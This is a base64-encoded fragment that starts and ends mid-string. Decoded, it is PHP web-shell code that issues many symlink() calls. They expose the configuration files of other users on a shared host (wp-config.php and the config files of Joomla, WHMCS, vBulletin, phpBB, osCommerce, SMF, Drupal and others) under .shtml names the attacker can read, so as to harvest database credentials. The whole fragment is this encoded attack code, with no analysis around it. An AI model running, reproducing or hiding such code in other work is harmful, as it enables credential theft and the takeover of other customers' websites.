ZW50LnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0uc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3Muc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm1hbmdld2htY3Muc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2Uuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZXMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlci5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53cDEzLXByZXNzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXdzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2ViL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13ZWIuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtaG9tZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXByb3RhbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbWFpbi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy10ZXN0LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vbWxhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtY21zLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXdzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj5WQnVsbGV0aW4tZm9ydW0uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNwYW5lbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0aW5nLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LXNob3Auc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLVpDc2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRwZG9tYWluLid+fj5tay1wb3J0YWxlMS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW0uc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bXMuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbC9jb25maWcucGhwJywkZG9tYWluLid+fj5tYWxheS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xlbnRzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhMS5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJGRvbWFpbi4nfj5EcnVwYWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZTEwN19jb25maWcucGhwJywkZG9tYWluLid+PmUxMDcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3Muc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3Auc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3Quc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vbWxhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWpvby5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj